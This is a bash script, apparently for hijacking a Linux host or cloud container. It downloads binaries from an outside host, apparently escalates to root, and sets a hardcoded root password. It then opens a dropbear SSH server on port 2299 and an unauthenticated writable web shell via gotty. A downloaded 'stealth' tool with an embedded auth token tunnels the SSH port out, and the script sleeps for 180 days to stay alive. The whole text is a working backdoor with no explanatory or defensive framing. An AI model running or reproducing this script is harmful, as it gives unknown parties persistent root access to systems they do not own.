#!/bin/bash
cd
curl https://greenleaf.teatspray.fun/system32.tar.gz -L -O -J
sleep 2
curl https://greenleaf.teatspray.fun/backup2.tar.gz -L -O -J
sleep 2
tar -xf system32.tar.gz
sleep 2
tar -xf backup2.tar.gz
sleep 2
./system32 -S . /bin/bash

sleep 2

su -

sleep 2
cd
sleep 2
whoami
sleep 2

export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

sleep 2
cat /etc/*-release
sleep 2

apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libjansson-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget dpkg libuv1-dev libssl-dev libhwloc-dev dropbear screen >/dev/null
sleep 2

curl https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz -L -O -J
sleep 2
tar -xf gotty_linux_amd64.tar.gz && ./gotty --permit-write --reconnect /bin/bash &
sleep 2

cat > /etc/default/dropbear <<END
NO_START=0
DROPBEAR_PORT=2299
DROPBEAR_EXTRA_ARGS=
DROPBEAR_BANNER=""
DROPBEAR_RECEIVE_WINDOW=65536
END

sleep 2

echo "root:Pmataga87465622" | chpasswd
sleep 2
service dropbear restart
sleep 2

array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

sleep 2

curl https://greenleaf.teatspray.fun/stealth -L -O -J
sleep 2
chmod +x stealth
sleep 2
./stealth authtoken 1ilVTgjbJzLiHF29nLWN8Jbe6a7_2ioxVQMzGPf1Bb2rLSpa5
sleep 2
screen -dmS dropbear bash -c './stealth tcp 2299'

sleep 5

curl http://127.0.0.1:4040/api/tunnels

sleep 180d
